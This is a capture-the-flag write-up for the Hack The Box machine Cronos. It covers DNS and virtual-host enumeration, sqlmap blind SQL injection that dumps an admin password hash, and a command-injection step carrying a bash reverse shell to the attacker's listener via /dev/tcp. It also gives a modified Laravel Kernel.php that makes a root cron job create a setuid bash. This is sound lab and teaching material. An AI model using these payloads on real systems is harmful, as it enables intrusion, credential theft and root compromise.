# Target
| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [Cronos](https://app.hackthebox.com/machines/Cronos) |  
| 🏷 **Type**       | HTB Machine                                          |
| 🖥 **OS**         | Linux                                                |
| 🎯 **Difficulty** | Medium                                               |
| 📁 **Tags**       | DNS, SQLi, command injection, Laravel                |

# Scan
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# Attack path
1. [Gain initial foothold by exploiting command injection in admin panel](#gain-initial-foothold-by-exploiting-command-injection-in-admin-panel)
2. [Escalate to `root` by adding root shell spawn Laravel scheduled task](#escalate-to-root-by-adding-root-shell-spawn-laravel-scheduled-task)

### Gain initial foothold by exploiting command injection in admin panel

#### Enumerate DNS server using reverse lookup
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ dig @$TARGET -x $TARGET                           

; <<>> DiG 9.20.4-3-Debian <<>> @10.129.227.211 -x 10.129.227.211
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57327
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;211.227.129.10.in-addr.arpa.   IN      PTR

;; ANSWER SECTION:
211.227.129.10.in-addr.arpa. 604800 IN  PTR     ns1.cronos.htb.

;; AUTHORITY SECTION:
129.10.in-addr.arpa.    604800  IN      NS      ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13

;; Query time: 911 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (UDP)
;; WHEN: Sat Sep 27 12:34:23 CEST 2025
;; MSG SIZE  rcvd: 114
```

#### Add `cronos.htb` domain to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ echo "$TARGET cronos.htb" | sudo tee -a /etc/hosts       
10.129.227.211 cronos.htb
```

#### Enumerate virtual hosts to discover `admin`
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ ffuf -r -u http://cronos.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cronos.htb" -mc 200 -fs 11439
<SNIP>
www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 441ms]
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 3914ms]
```

#### Add `admin.cronos.htb` virtual host to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ echo "$TARGET admin.cronos.htb" | sudo tee -a /etc/hosts
10.129.227.211 admin.cronos.htb 
```

#### Store HTTP `/login` request to file
Request obtained with Burp
```
cat <<'EOF'> login.http
POST / HTTP/1.1
Host: admin.cronos.htb
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin.cronos.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin.cronos.htb/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=1ajrrv059umt2ug5uqqq0eb1n5
Connection: keep-alive

username=admin&password=admin
EOF
```

#### Use `login.http` request to discover time-based blind SQLi with `sqlmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ sqlmap -r login.http --batch --level 3
<SNIP>
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 883 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1737 FROM (SELECT(SLEEP(5)))WoEo)-- Brvm&password=admin
---
<SNIP>
```

#### Use time-based blind SQLi to list databases
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ sqlmap -r login.http --batch --level 3 --dbs
<SNIP>
available databases [2]:
[*] `admin`
[*] information_schema
```

#### Use time-based blind SQLi to list tables in `admin` database
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ sqlmap -r login.http --batch --level 3 -D admin --tables
<SNIP>
Database: admin
[1 table]
+-------+
| users |
+-------+
```

#### Use time-based blind SQLi to list dump in `user` table
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ sqlmap -r login.http --batch --level 3 -D admin -T users --dump   
<SNIP>
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 4f5fffa7b2340178a716e3832451e058 | admin    |
+----+----------------------------------+----------+
```

#### Use `https://md5hashing.net` to 'reverse' MD5 hash
```
4f5fffa7b2340178a716e3832451e058 -> 1327663704
```

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
```

#### Exploit command injection to 
```
┌──(magicrc㉿perun)-[~/attack/HTB Cronos]
└─$ curl -s -c cookies.txt http://admin.cronos.htb/ -d 'username=admin&password=1327663704' -o /dev/null && \
COMMAND=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'" | jq -sRr @uri) && \
curl -b cookies.txt http://admin.cronos.htb/welcome.php -d "command=$COMMAND"
```

#### Confirm foothold gained
```
connect to [10.10.16.17] from (UNKNOWN) [10.129.227.211] 44912
bash: cannot set terminal process group (1363): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Escalate to `root` by adding root shell spawn Laravel scheduled task

#### Modify `/var/www/laravel/app/Console/Kernel.php` to create root shell
Misconfigured cronjob has been identified by `linpeas`.

`* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1`

```
cat <<'EOF'> /var/www/laravel/app/Console/Kernel.php
<?php

namespace App\Console;

use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;

class Kernel extends ConsoleKernel
{
    /**
     * The Artisan commands provided by your application.
     *
     * @var array
     */
    protected $commands = [
        //
    ];

    /**
     * Define the application's command schedule.
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
        $schedule->exec('cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell')->everyMinute();
    }

    /**
     * Register the Closure based commands for the application.
     *
     * @return void
     */
    protected function commands()
    {
        require base_path('routes/console.php');
    }
}
EOF
```

#### Wait until Laravel will execute job and run root shell
```
www-data@cronos:/var/www/admin$ /tmp/root_shell -p   
/tmp/root_shell -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
